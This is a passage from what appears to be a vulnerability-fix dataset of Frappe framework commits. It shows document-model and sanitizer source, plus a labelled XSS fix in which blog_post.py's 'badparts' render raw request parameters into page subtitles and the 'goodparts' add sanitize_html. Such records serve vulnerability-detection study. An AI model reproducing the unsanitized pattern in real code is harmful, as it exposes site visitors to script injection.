cstr(d[fieldname]).strip()==\"\":\n\t\t\t\t\t# unique empty field should be set to None\n\t\t\t\t\td[fieldname] = None\n\n\t\t\t\tif isinstance(d[fieldname], list) and df.fieldtype != 'Table':\n\t\t\t\t\tfrappe.throw(_('Value for {0} cannot be a list').format(_(df.label)))\n\n\t\t\t\tif convert_dates_to_str and isinstance(d[fieldname], (datetime.datetime, datetime.time, datetime.timedelta)):\n\t\t\t\t\td[fieldname] = str(d[fieldname])\n\n\t\treturn d\n\n\tdef init_valid_columns(self):\n\t\tfor key in default_fields:\n\t\t\tif key not in self.__dict__:\n\t\t\t\tself.__dict__[key] = None\n\n\t\t\tif key in (\"idx\", \"docstatus\") and self.__dict__[key] is None:\n\t\t\t\tself.__dict__[key] = 0\n\n\t\tfor key in self.get_valid_columns():\n\t\t\tif key not in self.__dict__:\n\t\t\t\tself.__dict__[key] = None\n\n\tdef get_valid_columns(self):\n\t\tif self.doctype not in frappe.local.valid_columns:\n\t\t\tif self.doctype in (\"DocField\", \"DocPerm\") and self.parent in (\"DocType\", \"DocField\", \"DocPerm\"):\n\t\t\t\tfrom frappe.model.meta import get_table_columns\n\t\t\t\tvalid = get_table_columns(self.doctype)\n\t\t\telse:\n\t\t\t\tvalid = self.meta.get_valid_columns()\n\n\t\t\tfrappe.local.valid_columns[self.doctype] = valid\n\n\t\treturn frappe.local.valid_columns[self.doctype]\n\n\tdef is_new(self):\n\t\treturn self.get(\"__islocal\")\n\n\tdef as_dict(self, no_nulls=False, no_default_fields=False, convert_dates_to_str=False):\n\t\tdoc = self.get_valid_dict(convert_dates_to_str=convert_dates_to_str)\n\t\tdoc[\"doctype\"] = self.doctype\n\t\tfor df in self.meta.get_table_fields():\n\t\t\tchildren = self.get(df.fieldname) or []\n\t\t\tdoc[df.fieldname] = [d.as_dict(no_nulls=no_nulls) for d in children]\n\n\t\tif no_nulls:\n\t\t\tfor k in list(doc):\n\t\t\t\tif doc[k] is None:\n\t\t\t\t\tdel doc[k]\n\n\t\tif no_default_fields:\n\t\t\tfor k in list(doc):\n\t\t\t\tif k in default_fields:\n\t\t\t\t\tdel doc[k]\n\n\t\tfor key in (\"_user_tags\", \"__islocal\", \"__onload\", \"_liked_by\", \"__run_link_triggers\"):\n\t\t\tif self.get(key):\n\t\t\t\tdoc[key] = self.get(key)\n\n\t\treturn doc\n\n\tdef as_json(self):\n\t\treturn frappe.as_json(self.as_dict())\n\n\tdef get_table_field_doctype(self, fieldname):\n\t\treturn self.meta.get_field(fieldname).options\n\n\tdef get_parentfield_of_doctype(self, doctype):\n\t\tfieldname = [df.fieldname for df in self.meta.get_table_fields() if df.options==doctype]\n\t\treturn fieldname[0] if fieldname else None\n\n\tdef db_insert(self):\n\t\t\"\"\"INSERT the document (with valid columns) in the database.\"\"\"\n\t\tif not self.name:\n\t\t\t# name will be set by document class in most cases\n\t\t\tset_new_name(self)\n\n\t\tif not self.creation:\n\t\t\tself.creation = self.modified = now()\n\t\t\tself.created_by = self.modifield_by = frappe.session.user\n\n\t\td = self.get_valid_dict(convert_dates_to_str=True)\n\n\t\tcolumns = list(d)\n\t\ttry:\n\t\t\tfrappe.db.sql(\"\"\"insert into `tab{doctype}`\n\t\t\t\t({columns}) values ({values})\"\"\".format(\n\t\t\t\t\tdoctype = self.doctype,\n\t\t\t\t\tcolumns = \", \".join([\"`\"+c+\"`\" for c in columns]),\n\t\t\t\t\tvalues = \", \".join([\"%s\"] * len(columns))\n\t\t\t\t), list(d.values()))\n\t\texcept Exception as e:\n\t\t\tif e.args[0]==1062:\n\t\t\t\tif \"PRIMARY\" in cstr(e.args[1]):\n\t\t\t\t\tif self.meta.autoname==\"hash\":\n\t\t\t\t\t\t# hash collision? try again\n\t\t\t\t\t\tself.name = None\n\t\t\t\t\t\tself.db_insert()\n\t\t\t\t\t\treturn\n\n\t\t\t\t\traise frappe.DuplicateEntryError(self.doctype, self.name, e)\n\n\t\t\t\telif \"Duplicate\" in cstr(e.args[1]):\n\t\t\t\t\t# unique constraint\n\t\t\t\t\tself.show_unique_validation_message(e)\n\t\t\t\telse:\n\t\t\t\t\traise\n\t\t\telse:\n\t\t\t\traise\n\t\tself.set(\"__islocal\", False)\n\n\tdef db_update(self):\n\t\tif self.get(\"__islocal\") or not self.name:\n\t\t\tself.db_insert()\n\t\t\treturn\n\n\t\td = self.get_valid_dict(convert_dates_to_str=True)\n\n\t\t# don't update name, as case might've been changed\n\t\tname = d['name']\n\t\tdel d['name']\n\n\t\tcolumns = list(d)\n\n\t\ttry:\n\t\t\tfrappe.db.sql(\"\"\"update `tab{doctype}`\n\t\t\t\tset {values} where name=%s\"\"\".format(\n\t\t\t\t\tdoctype = self.doctype,\n\t\t\t\t\tvalues = \", \".join([\"`\"+c+\"`=%s\" for c in columns])\n\t\t\t\t), list(d.values()) + [name])\n\t\texcept Exception as e:\n\t\t\tif e.args[0]==1062 and \"Duplicate\" in cstr(e.args[1]):\n\t\t\t\tself.show_unique_validation_message(e)\n\t\t\telse:\n\t\t\t\traise\n\n\tdef show_unique_validation_message(self, e):\n\t\ttype, value, traceback = sys.exc_info()\n\t\tfieldname, label = str(e).split(\"'\")[-2], None\n\n\t\t# unique_first_fieldname_second_fieldname is the constraint name\n\t\t# created using frappe.db.add_unique\n\t\tif \"unique_\" in fieldname:\n\t\t\tfieldname = fieldname.split(\"_\", 1)[1]\n\n\t\tdf = self.meta.get_field(fieldname)\n\t\tif df:\n\t\t\tlabel = df.label\n\n\t\tfrappe.msgprint(_(\"{0} must be unique\".format(label or fieldname)))\n\n\t\t# this is used to preserve traceback\n\t\traise frappe.UniqueValidationError(self.doctype, self.name, e)\n\n\tdef update_modified(self):\n\t\t'''Update modified timestamp'''\n\t\tself.set(\"modified\", now())\n\t\tfrappe.db.set_value(self.doctype, self.name, 'modified', self.modified, update_modified=False)\n\n\tdef _fix_numeric_types(self):\n\t\tfor df in self.meta.get(\"fields\"):\n\t\t\tif df.fieldtype == \"Check\":\n\t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname)))\n\n\t\t\telif self.get(df.fieldname) is not None:\n\t\t\t\tif df.fieldtype == \"Int\":\n\t\t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname)))\n\n\t\t\t\telif df.fieldtype in (\"Float\", \"Currency\", \"Percent\"):\n\t\t\t\t\tself.set(df.fieldname, flt(self.get(df.fieldname)))\n\n\t\tif self.docstatus is not None:\n\t\t\tself.docstatus = cint(self.docstatus)\n\n\tdef _get_missing_mandatory_fields(self):\n\t\t\"\"\"Get mandatory fields that do not have any values\"\"\"\n\t\tdef get_msg(df):\n\t\t\tif df.fieldtype == \"Table\":\n\t\t\t\treturn \"{}: {}: {}\".format(_(\"Error\"), _(\"Data missing in table\"), _(df.label))\n\n\t\t\telif self.parentfield:\n\t\t\t\treturn \"{}: {} {} #{}: {}: {}\".format(_(\"Error\"), frappe.bold(_(self.doctype)),\n\t\t\t\t\t_(\"Row\"), self.idx, _(\"Value missing for\"), _(df.label))\n\n\t\t\telse:\n\t\t\t\treturn _(\"Error: Value missing for {0}: {1}\").format(_(df.parent), _(df.label))\n\n\t\tmissing = []\n\n\t\tfor df in self.meta.get(\"fields\", {\"reqd\": ('=', 1)}):\n\t\t\tif self.get(df.fieldname) in (None, []) or not strip_html(cstr(self.get(df.fieldname))).strip():\n\t\t\t\tmissing.append((df.fieldname, get_msg(df)))\n\n\t\t# check for missing parent and parenttype\n\t\tif self.meta.istable:\n\t\t\tfor fieldname in (\"parent\", \"parenttype\"):\n\t\t\t\tif not self.get(fieldname):\n\t\t\t\t\tmissing.append((fieldname, get_msg(frappe._dict(label=fieldname))))\n\n\t\treturn missing\n\n\tdef get_invalid_links(self, is_submittable=False):\n\t\t'''Returns list of invalid links and also updates fetch values if not set'''\n\t\tdef get_msg(df, docname):\n\t\t\tif self.parentfield:\n\t\t\t\treturn \"{} #{}: {}: {}\".format(_(\"Row\"), self.idx, _(df.label), docname)\n\t\t\telse:\n\t\t\t\treturn \"{}: {}\".format(_(df.label), docname)\n\n\t\tinvalid_links = []\n\t\tcancelled_links = []\n\n\t\tfor df in (self.meta.get_link_fields()\n\t\t\t\t+ self.meta.get(\"fields\", {\"fieldtype\": ('=', \"Dynamic Link\")})):\n\t\t\tdocname = self.get(df.fieldname)\n\n\t\t\tif docname:\n\t\t\t\tif df.fieldtype==\"Link\":\n\t\t\t\t\tdoctype = df.options\n\t\t\t\t\tif not doctype:\n\t\t\t\t\t\tfrappe.throw(_(\"Options not set for link field {0}\").format(df.fieldname))\n\t\t\t\telse:\n\t\t\t\t\tdoctype = self.get(df.options)\n\t\t\t\t\tif not doctype:\n\t\t\t\t\t\tfrappe.throw(_(\"{0} must be set first\").format(self.meta.get_label(df.options)))\n\n\t\t\t\t# MySQL is case insensitive. Preserve case of the original docname in the Link Field.\n\n\t\t\t\t# get a map of values ot fetch along with this link query\n\t\t\t\t# that are mapped as link_fieldname.source_fieldname in Options of\n\t\t\t\t# Readonly or Data or Text type fields\n\n\t\t\t\tfields_to_fetch = [\n\t\t\t\t\t_df for _df in self.meta.get_fields_to_fetch(df.fieldname)\n\t\t\t\t\tif\n\t\t\t\t\t\tnot _df.get('fetch_if_empty')\n\t\t\t\t\t\tor (_df.get('fetch_if_empty') and not self.get(_df.fieldname))\n\t\t\t\t]\n\n\t\t\t\tif not fields_to_fetch:\n\t\t\t\t\t# cache a single value type\n\t\t\t\t\tvalues = frappe._dict(name=frappe.db.get_value(doctype, docname,\n\t\t\t\t\t\t'name', cache=True))\n\t\t\t\telse:\n\t\t\t\t\tvalues_to_fetch = ['name'] + [_df.fetch_from.split('.')[-1]\n\t\t\t\t\t\tfor _df in fields_to_fetch]\n\n\t\t\t\t\t# don't cache if fetching other values too\n\t\t\t\t\tvalues = frappe.db.get_value(doctype, docname,\n\t\t\t\t\t\tvalues_to_fetch, as_dict=True)\n\n\t\t\t\tif frappe.get_meta(doctype).issingle:\n\t\t\t\t\tvalues.name = doctype\n\n\t\t\t\tif values:\n\t\t\t\t\tsetattr(self, df.fieldname, values.name)\n\n\t\t\t\t\tfor _df in fields_to_fetch:\n\t\t\t\t\t\tif self.is_new() or self.docstatus != 1 or _df.allow_on_submit:\n\t\t\t\t\t\t\tsetattr(self, _df.fieldname, values[_df.fetch_from.split('.')[-1]])\n\n\t\t\t\t\tnotify_link_count(doctype, docname)\n\n\t\t\t\t\tif not values.name:\n\t\t\t\t\t\tinvalid_links.append((df.fieldname, docname, get_msg(df, docname)))\n\n\t\t\t\t\telif (df.fieldname != \"amended_from\"\n\t\t\t\t\t\tand (is_submittable or self.meta.is_submittable) and frappe.get_meta(doctype).is_submittable\n\t\t\t\t\t\tand cint(frappe.db.get_value(doctype, docname, \"docstatus\"))==2):\n\n\t\t\t\t\t\tcancelled_links.append((df.fieldname, docname, get_msg(df, docname)))\n\n\t\treturn invalid_links, cancelled_links\n\n\tdef _validate_selects(self):\n\t\tif frappe.flags.in_import:\n\t\t\treturn\n\n\t\tfor df in self.meta.get_select_fields():\n\t\t\tif df.fieldname==\"naming_series\" or not (self.get(df.fieldname) and df.options):\n\t\t\t\tcontinue\n\n\t\t\toptions = (df.options or \"\").split(\"\\n\")\n\n\t\t\t# if only empty options\n\t\t\tif not filter(None, options):\n\t\t\t\tcontinue\n\n\t\t\t# strip and set\n\t\t\tself.set(df.fieldname, cstr(self.get(df.fieldname)).strip())\n\t\t\tvalue = self.get(df.fieldname)\n\n\t\t\tif value not in options and not (frappe.flags.in_test and value.startswith(\"_T-\")):\n\t\t\t\t# show an elaborate message\n\t\t\t\tprefix = _(\"Row #{0}:\").format(self.idx) if self.get(\"parentfield\") else \"\"\n\t\t\t\tlabel = _(self.meta.get_label(df.fieldname))\n\t\t\t\tcomma_options = '\", \"'.join(_(each) for each in options)\n\n\t\t\t\tfrappe.throw(_('{0} {1} cannot be \"{2}\". It should be one of \"{3}\"').format(prefix, label,\n\t\t\t\t\tvalue, comma_options))\n\n\tdef _validate_constants(self):\n\t\tif frappe.flags.in_import or self.is_new() or self.flags.ignore_validate_constants:\n\t\t\treturn\n\n\t\tconstants = [d.fieldname for d in self.meta.get(\"fields\", {\"set_only_once\": ('=',1)})]\n\t\tif constants:\n\t\t\tvalues = frappe.db.get_value(self.doctype, self.name, constants, as_dict=True)\n\n\t\tfor fieldname in constants:\n\t\t\tdf = self.meta.get_field(fieldname)\n\n\t\t\t# This conversion to string only when fieldtype is Date\n\t\t\tif df.fieldtype == 'Date' or df.fieldtype == 'Datetime':\n\t\t\t\tvalue = str(values.get(fieldname))\n\n\t\t\telse:\n\t\t\t\tvalue  = values.get(fieldname)\n\n\t\t\tif self.get(fieldname) != value:\n\t\t\t\tfrappe.throw(_(\"Value cannot be changed for {0}\").format(self.meta.get_label(fieldname)),\n\t\t\t\t\tfrappe.CannotChangeConstantError)\n\n\tdef _validate_length(self):\n\t\tif frappe.flags.in_install:\n\t\t\treturn\n\n\t\tif self.meta.issingle:\n\t\t\t# single doctype value type is mediumtext\n\t\t\treturn\n\n\t\tcolumn_types_to_check_length = ('varchar', 'int', 'bigint')\n\n\t\tfor fieldname, value in iteritems(self.get_valid_dict()):\n\t\t\tdf = self.meta.get_field(fieldname)\n\n\t\t\tif not df or df.fieldtype == 'Check':\n\t\t\t\t# skip standard fields and Check fields\n\t\t\t\tcontinue\n\n\t\t\tcolumn_type = type_map[df.fieldtype][0] or None\n\t\t\tdefault_column_max_length = type_map[df.fieldtype][1] or None\n\n\t\t\tif df and df.fieldtype in type_map and column_type in column_types_to_check_length:\n\t\t\t\tmax_length = cint(df.get(\"length\")) or cint(default_column_max_length)\n\n\t\t\t\tif len(cstr(value)) > max_length:\n\t\t\t\t\tif self.parentfield and self.idx:\n\t\t\t\t\t\treference = _(\"{0}, Row {1}\").format(_(self.doctype), self.idx)\n\n\t\t\t\t\telse:\n\t\t\t\t\t\treference = \"{0} {1}\".format(_(self.doctype), self.name)\n\n\t\t\t\t\tfrappe.throw(_(\"{0}: '{1}' ({3}) will get truncated, as max characters allowed is {2}\")\\\n\t\t\t\t\t\t.format(reference, _(df.label), max_length, value), frappe.CharacterLengthExceededError, title=_('Value too big'))\n\n\tdef _validate_update_after_submit(self):\n\t\t# get the full doc with children\n\t\tdb_values = frappe.get_doc(self.doctype, self.name).as_dict()\n\n\t\tfor key in self.as_dict():\n\t\t\tdf = self.meta.get_field(key)\n\t\t\tdb_value = db_values.get(key)\n\n\t\t\tif df and not df.allow_on_submit and (self.get(key) or db_value):\n\t\t\t\tif df.fieldtype==\"Table\":\n\t\t\t\t\t# just check if the table size has changed\n\t\t\t\t\t# individual fields will be checked in the loop for children\n\t\t\t\t\tself_value = len(self.get(key))\n\t\t\t\t\tdb_value = len(db_value)\n\n\t\t\t\telse:\n\t\t\t\t\tself_value = self.get_value(key)\n\n\t\t\t\tif self_value != db_value:\n\t\t\t\t\tfrappe.throw(_(\"Not allowed to change {0} after submission\").format(df.label),\n\t\t\t\t\t\tfrappe.UpdateAfterSubmitError)\n\n\tdef _sanitize_content(self):\n\t\t\"\"\"Sanitize HTML and Email in field values. Used to prevent XSS.\n\n\t\t\t- Ignore if 'Ignore XSS Filter' is checked or fieldtype is 'Code'\n\t\t\"\"\"\n\t\tif frappe.flags.in_install:\n\t\t\treturn\n\n\t\tfor fieldname, value in self.get_valid_dict().items():\n\t\t\tif not value or not isinstance(value, string_types):\n\t\t\t\tcontinue\n\n\t\t\tvalue = frappe.as_unicode(value)\n\n\t\t\tif (u\"<\" not in value and u\">\" not in value):\n\t\t\t\t# doesn't look like html so no need\n\t\t\t\tcontinue\n\n\t\t\telif \"<!-- markdown -->\" in value and not (\"<script\" in value or \"javascript:\" in value):\n\t\t\t\t# should be handled separately via the markdown converter function\n\t\t\t\tcontinue\n\n\t\t\tdf = self.meta.get_field(fieldname)\n\t\t\tsanitized_value = value\n\n\t\t\tif df and df.get(\"fieldtype\") in (\"Data\", \"Code\", \"Small Text\") and df.get(\"options\")==\"Email\":\n\t\t\t\tsanitized_value = sanitize_email(value)\n\n\t\t\telif df and (df.get(\"ignore_xss_filter\")\n\t\t\t\t\t\tor (df.get(\"fieldtype\")==\"Code\" and df.get(\"options\")!=\"Email\")\n\t\t\t\t\t\tor df.get(\"fieldtype\") in (\"Attach\", \"Attach Image\")\n\n\t\t\t\t\t\t# cancelled and submit but not update after submit should be ignored\n\t\t\t\t\t\tor self.docstatus==2\n\t\t\t\t\t\tor (self.docstatus==1 and not df.get(\"allow_on_submit\"))):\n\t\t\t\tcontinue\n\n\t\t\telse:\n\t\t\t\tsanitized_value = sanitize_html(value, linkify=df.fieldtype=='Text Editor')\n\n\t\t\tself.set(fieldname, sanitized_value)\n\n\tdef _save_passwords(self):\n\t\t'''Save password field values in __Auth table'''\n\t\tif self.flags.ignore_save_passwords is True:\n\t\t\treturn\n\n\t\tfor df in self.meta.get('fields', {'fieldtype': ('=', 'Password')}):\n\t\t\tif self.flags.ignore_save_passwords and df.fieldname in self.flags.ignore_save_passwords: continue\n\t\t\tnew_password = self.get(df.fieldname)\n\t\t\tif new_password and not self.is_dummy_password(new_password):\n\t\t\t\t# is not a dummy password like '*****'\n\t\t\t\tset_encrypted_password(self.doctype, self.name, new_password, df.fieldname)\n\n\t\t\t\t# set dummy password like '*****'\n\t\t\t\tself.set(df.fieldname, '*'*len(new_password))\n\n\tdef get_password(self, fieldname='password', raise_exception=True):\n\t\tif self.get(fieldname) and not self.is_dummy_password(self.get(fieldname)):\n\t\t\treturn self.get(fieldname)\n\n\t\treturn get_decrypted_password(self.doctype, self.name, fieldname, raise_exception=raise_exception)\n\n\tdef is_dummy_password(self, pwd):\n\t\treturn ''.join(set(pwd))=='*'\n\n\tdef precision(self, fieldname, parentfield=None):\n\t\t\"\"\"Returns float precision for a particular field (or get global default).\n\n\t\t:param fieldname: Fieldname for which precision is required.\n\t\t:param parentfield: If fieldname is in child table.\"\"\"\n\t\tfrom frappe.model.meta import get_field_precision\n\n\t\tif parentfield and not isinstance(parentfield, string_types):\n\t\t\tparentfield = parentfield.parentfield\n\n\t\tcache_key = parentfield or \"main\"\n\n\t\tif not hasattr(self, \"_precision\"):\n\t\t\tself._precision = frappe._dict()\n\n\t\tif cache_key not in self._precision:\n\t\t\tself._precision[cache_key] = frappe._dict()\n\n\t\tif fieldname not in self._precision[cache_key]:\n\t\t\tself._precision[cache_key][fieldname] = None\n\n\t\t\tdoctype = self.meta.get_field(parentfield).options if parentfield else self.doctype\n\t\t\tdf = frappe.get_meta(doctype).get_field(fieldname)\n\n\t\t\tif df.fieldtype in (\"Currency\", \"Float\", \"Percent\"):\n\t\t\t\tself._precision[cache_key][fieldname] = get_field_precision(df, self)\n\n\t\treturn self._precision[cache_key][fieldname]\n\n\n\tdef get_formatted(self, fieldname, doc=None, currency=None, absolute_value=False, translated=False):\n\t\tfrom frappe.utils.formatters import format_value\n\n\t\tdf = self.meta.get_field(fieldname)\n\t\tif not df and fieldname in default_fields:\n\t\t\tfrom frappe.model.meta import get_default_df\n\t\t\tdf = get_default_df(fieldname)\n\n\t\tval = self.get(fieldname)\n\n\t\tif translated:\n\t\t\tval = _(val)\n\n\t\tif absolute_value and isinstance(val, (int, float)):\n\t\t\tval = abs(self.get(fieldname))\n\n\t\tif not doc:\n\t\t\tdoc = getattr(self, \"parent_doc\", None) or self\n\n\t\treturn format_value(val, df=df, doc=doc, currency=currency)\n\n\tdef is_print_hide(self, fieldname, df=None, for_print=True):\n\t\t\"\"\"Returns true if fieldname is to be hidden for print.\n\n\t\tPrint Hide can be set via the Print Format Builder or in the controller as a list\n\t\tof hidden fields. Example\n\n\t\t\tclass MyDoc(Document):\n\t\t\t\tdef __setup__(self):\n\t\t\t\t\tself.print_hide = [\"field1\", \"field2\"]\n\n\t\t:param fieldname: Fieldname to be checked if hidden.\n\t\t\"\"\"\n\t\tmeta_df = self.meta.get_field(fieldname)\n\t\tif meta_df and meta_df.get(\"__print_hide\"):\n\t\t\treturn True\n\n\t\tprint_hide = 0\n\n\t\tif self.get(fieldname)==0 and not self.meta.istable:\n\t\t\tprint_hide = ( df and df.print_hide_if_no_value ) or ( meta_df and meta_df.print_hide_if_no_value )\n\n\t\tif not print_hide:\n\t\t\tif df and df.print_hide is not None:\n\t\t\t\tprint_hide = df.print_hide\n\t\t\telif meta_df:\n\t\t\t\tprint_hide = meta_df.print_hide\n\n\t\treturn print_hide\n\n\tdef in_format_data(self, fieldname):\n\t\t\"\"\"Returns True if shown via Print Format::`format_data` property.\n\t\t\tCalled from within standard print format.\"\"\"\n\t\tdoc = getattr(self, \"parent_doc\", self)\n\n\t\tif hasattr(doc, \"format_data_map\"):\n\t\t\treturn fieldname in doc.format_data_map\n\t\telse:\n\t\t\treturn True\n\n\tdef reset_values_if_no_permlevel_access(self, has_access_to, high_permlevel_fields):\n\t\t\"\"\"If the user does not have permissions at permlevel > 0, then reset the values to original / default\"\"\"\n\t\tto_reset = []\n\n\t\tfor df in high_permlevel_fields:\n\t\t\tif df.permlevel not in has_access_to and df.fieldtype not in display_fieldtypes:\n\t\t\t\tto_reset.append(df)\n\n\t\tif to_reset:\n\t\t\tif self.is_new():\n\t\t\t\t# if new, set default value\n\t\t\t\tref_doc = frappe.new_doc(self.doctype)\n\t\t\telse:\n\t\t\t\t# get values from old doc\n\t\t\t\tif self.get('parent_doc'):\n\t\t\t\t\tself.parent_doc.get_latest()\n\t\t\t\t\tref_doc = [d for d in self.parent_doc.get(self.parentfield) if d.name == self.name][0]\n\t\t\t\telse:\n\t\t\t\t\tref_doc = self.get_latest()\n\n\t\t\tfor df in to_reset:\n\t\t\t\tself.set(df.fieldname, ref_doc.get(df.fieldname))\n\n\tdef get_value(self, fieldname):\n\t\tdf = self.meta.get_field(fieldname)\n\t\tval = self.get(fieldname)\n\n\t\treturn self.cast(val, df)\n\n\tdef cast(self, value, df):\n\t\treturn cast_fieldtype(df.fieldtype, value)\n\n\tdef _extract_images_from_text_editor(self):\n\t\tfrom frappe.utils.file_manager import extract_images_from_doc\n\t\tif self.doctype != \"DocType\":\n\t\t\tfor df in self.meta.get(\"fields\", {\"fieldtype\": ('=', \"Text Editor\")}):\n\t\t\t\textract_images_from_doc(self, df.fieldname)\n\ndef _filter(data, filters, limit=None):\n\t\"\"\"pass filters as:\n\t\t{\"key\": \"val\", \"key\": [\"!=\", \"val\"],\n\t\t\"key\": [\"in\", \"val\"], \"key\": [\"not in\", \"val\"], \"key\": \"^val\",\n\t\t\"key\" : True (exists), \"key\": False (does not exist) }\"\"\"\n\n\tout, _filters = [], {}\n\n\tif not data:\n\t\treturn out\n\n\t# setup filters as tuples\n\tif filters:\n\t\tfor f in filters:\n\t\t\tfval = filters[f]\n\n\t\t\tif not isinstance(fval, (tuple, list)):\n\t\t\t\tif fval is True:\n\t\t\t\t\tfval = (\"not None\", fval)\n\t\t\t\telif fval is False:\n\t\t\t\t\tfval = (\"None\", fval)\n\t\t\t\telif isinstance(fval, string_types) and fval.startswith(\"^\"):\n\t\t\t\t\tfval = (\"^\", fval[1:])\n\t\t\t\telse:\n\t\t\t\t\tfval = (\"=\", fval)\n\n\t\t\t_filters[f] = fval\n\n\tfor d in data:\n\t\tadd = True\n\t\tfor f, fval in iteritems(_filters):\n\t\t\tif not frappe.compare(getattr(d, f, None), fval[0], fval[1]):\n\t\t\t\tadd = False\n\t\t\t\tbreak\n\n\t\tif add:\n\t\t\tout.append(d)\n\t\t\tif limit and (len(out)-1)==limit:\n\t\t\t\tbreak\n\n\treturn out\n"
                }
            },
            "msg": "fix(Barcode): excluding Barcode feild from XSS FIlter (#7605)\n\n(cherry picked from commit e579b8960e1c34e7ad0bf794a10596b40530bc09)"
        }
    },
    "https://github.com/pardeep11/frappe": {
        "2fa19c25066ed17478d683666895e3266936aee6": {
            "url": "https://api.github.com/repos/pardeep11/frappe/commits/2fa19c25066ed17478d683666895e3266936aee6",
            "html_url": "https://github.com/pardeep11/frappe/commit/2fa19c25066ed17478d683666895e3266936aee6",
            "sha": "2fa19c25066ed17478d683666895e3266936aee6",
            "keyword": "XSS fix",
            "diff": "diff --git a/frappe/website/doctype/blog_post/blog_post.py b/frappe/website/doctype/blog_post/blog_post.py\nindex a20e9fa12..e4c757e64 100644\n--- a/frappe/website/doctype/blog_post/blog_post.py\n+++ b/frappe/website/doctype/blog_post/blog_post.py\n@@ -7,7 +7,7 @@\n from frappe import _\n from frappe.website.website_generator import WebsiteGenerator\n from frappe.website.render import clear_cache\n-from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown\n+from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown, sanitize_html\n from frappe.website.utils import find_first_image, get_comment_list\n \n class BlogPost(WebsiteGenerator):\n@@ -95,7 +95,7 @@ def get_list_context(context=None):\n \t\ttitle = _('Blog')\n \t)\n \n-\tcategory = frappe.local.form_dict.blog_category or frappe.local.form_dict.category\n+\tcategory = sanitize_html(frappe.local.form_dict.blog_category or frappe.local.form_dict.category)\n \tif category:\n \t\tcategory_title = get_blog_category(category)\n \t\tlist_context.sub_title = _(\"Posts filed under {0}\").format(category_title)\n@@ -107,7 +107,7 @@ def get_list_context(context=None):\n \t\tlist_context.title = blogger\n \n \telif frappe.local.form_dict.txt:\n-\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(frappe.local.form_dict.txt)\n+\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(sanitize_html(frappe.local.form_dict.txt))\n \n \tif list_context.sub_title:\n \t\tlist_context.parents = [{\"name\": _(\"Home\"), \"route\": \"/\"},\n",
            "message": "",
            "files": {
                "/frappe/website/doctype/blog_post/blog_post.py": {
                    "changes": [
                        {
                            "diff": "\n from frappe import _\n from frappe.website.website_generator import WebsiteGenerator\n from frappe.website.render import clear_cache\n-from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown\n+from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown, sanitize_html\n from frappe.website.utils import find_first_image, get_comment_list\n \n class BlogPost(WebsiteGenerator):\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/frappe/website/doctype/blog_post/blog_post.py",
                            "badparts": [
                                "from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown"
                            ],
                            "goodparts": [
                                "from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown, sanitize_html"
                            ]
                        },
                        {
                            "diff": "\n \t\ttitle = _('Blog')\n \t)\n \n-\tcategory = frappe.local.form_dict.blog_category or frappe.local.form_dict.category\n+\tcategory = sanitize_html(frappe.local.form_dict.blog_category or frappe.local.form_dict.category)\n \tif category:\n \t\tcategory_title = get_blog_category(category)\n \t\tlist_context.sub_title = _(\"Posts filed under {0}\").format(category_title)\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/frappe/website/doctype/blog_post/blog_post.py",
                            "badparts": [
                                "\tcategory = frappe.local.form_dict.blog_category or frappe.local.form_dict.category"
                            ],
                            "goodparts": [
                                "\tcategory = sanitize_html(frappe.local.form_dict.blog_category or frappe.local.form_dict.category)"
                            ]
                        },
                        {
                            "diff": "\n \t\tlist_context.title = blogger\n \n \telif frappe.local.form_dict.txt:\n-\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(frappe.local.form_dict.txt)\n+\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(sanitize_html(frappe.local.form_dict.txt))\n \n \tif list_context.sub_title:\n \t\tlist_context.parents = [{\"name\": _(\"Home\"), \"route\": \"/\"},\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/frappe/website/doctype/blog_post/blog_post.py",
                            "badparts": [
                                "\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(frappe.local.form_dict.txt)"
                            ],
                            "goodparts": [
                                "\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(sanitize_html(frappe.local.form_dict.txt))"
                            ]
                        }
                    ],
                    "source": "\n from __future__ import unicode_literals import frappe from frappe import _ from frappe.website.website_generator import WebsiteGenerator from frappe.website.render import clear_cache from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown from frappe.website.utils import find_first_image, get_comment_list class BlogPost(WebsiteGenerator): \twebsite=frappe._dict( \t\torder_by=\"published_on desc\" \t) \tdef make_route(self): \t\tif not self.route: \t\t\treturn frappe.db.get_value('Blog Category', self.blog_category, \t\t\t\t'route') +'/' +self.scrub(self.title) \tdef get_feed(self): \t\treturn self.title \tdef validate(self): \t\tsuper(BlogPost, self).validate() \t\tif not self.blog_intro: \t\t\tself.blog_intro=self.content[:140] \t\t\tself.blog_intro=strip_html_tags(self.blog_intro) \t\tif self.blog_intro: \t\t\tself.blog_intro=self.blog_intro[:140] \t\tif self.published and not self.published_on: \t\t\tself.published_on=today() \t\t \t\tfrappe.db.sql(\"\"\"update tabBlogger set posts=(select count(*) from `tabBlog Post` \t\t\twhere ifnull(blogger,'')=tabBlogger.name) \t\t\twhere name=%s\"\"\",(self.blogger,)) \tdef on_update(self): \t\tclear_cache(\"writers\") \tdef get_context(self, context): \t\t \t\tif not cint(self.published): \t\t\traise Exception(\"This blog has not been published yet!\") \t\t \t\tcontext.full_name=get_fullname(self.owner) \t\tcontext.updated=global_date_format(self.published_on) \t\tif self.blogger: \t\t\tcontext.blogger_info=frappe.get_doc(\"Blogger\", self.blogger).as_dict() \t\tcontext.description=self.blog_intro or self.content[:140] \t\tcontext.metatags={ \t\t\t\"name\": self.title, \t\t\t\"description\": context.description, \t\t} \t\tif \"<!--markdown -->\" in context.content: \t\t\tcontext.content=markdown(context.content) \t\timage=find_first_image(self.content) \t\tif image: \t\t\tcontext.metatags[\"image\"]=image 